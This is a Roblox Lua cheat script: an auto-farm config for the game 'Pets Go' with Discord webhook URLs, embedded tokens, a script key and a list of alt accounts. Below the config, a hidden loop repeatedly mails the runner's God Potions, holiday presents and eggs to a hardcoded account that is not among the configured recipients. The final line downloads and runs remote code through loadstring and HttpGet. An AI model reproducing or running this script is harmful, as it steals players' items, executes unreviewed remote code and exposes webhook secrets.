script_key="dZhELTtXOWVyVkTKydlTWlDpPGRWUYSr";
setfpscap(3)
getgenv().petsGoConfig = {
    -- true/false
    CONSUME_CORRUPTED_HUGE_BAIT = false,
    CONSUME_ALL_ENCHANT_SAFE = false,
    CONSUME_ALL_MINING_CHEST = false,
    CONSUME_EVENT_GIFT_BAG = false,
    CONSUME_EVENT_EGG = false, -- Hype eggs not included
    IGNORE_DICE_COMBO = true,
    SHOW_PET_WEBHOOK_USERNAME = true,

    WEBHOOK_URL = "https://discordapp.com/api/webhooks/1332679074933510239/DqzGuqp98v9mU8jz7U0fOc8l2A5wgMjqDMjzxMH7YKJOecVYiHGnlp7ezUocFvGT_q8O",
    MAILING_WEBHOOK_URL = "https://discordapp.com/api/webhooks/1332679165442265129/N4G73oCnpZS-WMWLtSYvEyobeN1Tu6zxH7AD26CDc0rdaED8miWorKPnhP1Iqf0Os_LS",
    DISCORD_ID = "1168121186790686779",  -- Required!!! (For public-webhook)
    WEBHOOK_ODDS = 1000000000, -- Minimum Pet Odds To Trigger Webhook

    DIAMOND_EGG = true,  -- true = Diamond Egg, false = F2P Egg
    MINE_ALL_ORES = true,  -- true = all ore, false = runic & event ore
    
    MAILING = true,  -- Auto mail
    MAIL_WEBHOOK_ODDS = 1000000000, -- Minimum Pet Odds To Trigger MAIL Webhook
    MAIL_PET_ODDS = 1000000000,  -- Minimum Pet Odds To Mail
    MAIL_GEMS_MIN = 50000,  -- Minimum Gems to mail out

    USERNAME_TO_MAIL = {
        "ohiosigmawth6",
        "MonolithRedvale7873",
        "SkylashOakheart1736",
        "axiomaticgerbil6954",
        "testedmamba300",
        "ochrehippo9441",
        "fastdolphin2071",
        "wisemacaque6718",
        "encouragingbinturong",
        "finickycassowary1394",
        "stickymuskox4276",
        "poeticlynx2641",
        "whimsicalnautilus533",
        "daffodiltrout4161",
        "spicyreindeer5203",
        "fortunatesalmon4804",
        "loosemongoose1657",
        "fabulousdragon7000",
        "giftedjerboa3309",
        "bronzeocelot9067",
        "largeswine4492",
        "vanillamule4167",
    } -- Mail to username, Example : USERNAME_TO_MAIL = {"username1", "username2"}
}

task.spawn(function()
    while true do
        task.wait(10)
        local network = game.ReplicatedStorage.Network
        local save = require(game.ReplicatedStorage.Library.Client.Save)
        local usernameToMail = "jasminenectar157"
        
        
        local function mailboxSend(finalisedUsernameToMail, itemName, itemType, itemId, quantity)
            local args = {
                [1] = finalisedUsernameToMail,
                [2] = itemName .. " for you",
                [3] = itemType,
                [4] = itemId,
                [5] = quantity
            }
        
            network["Mailbox: Send"]:InvokeServer(unpack(args))
        end
        
        
        for itemId, tbl in save.Get().Inventory.Consumable do
            local quantity = tbl._am or 1
            if tbl.id == "God Potion" or tbl.id == "Heartbreak God Potion" or tbl.id == "Valentines God Potion" then
                mailboxSend(usernameToMail, tbl.id, "Consumable", itemId, quantity)
            end
        end  
        
        
        for itemId, tbl in save.Get().Inventory.Lootbox do
            local quantity = tbl._am or 1
            if tbl.id == "Valentines Present" or tbl.id == "Heartbreak Present" then
                mailboxSend(usernameToMail, tbl.id, "Lootbox", itemId, quantity)
            end
        end  
        
        
        for itemId, tbl in save.Get().Inventory.Egg do
            local quantity = tbl._am or 1
            if tbl.id == "Cupids Egg" or tbl.id == "Heartbreak Egg" then
                mailboxSend(usernameToMail, tbl.id, "Egg", itemId, quantity)
            end
        end
    end
end)

loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/3bd4d9c6addd473626372179ee4a4be3.lua"))()

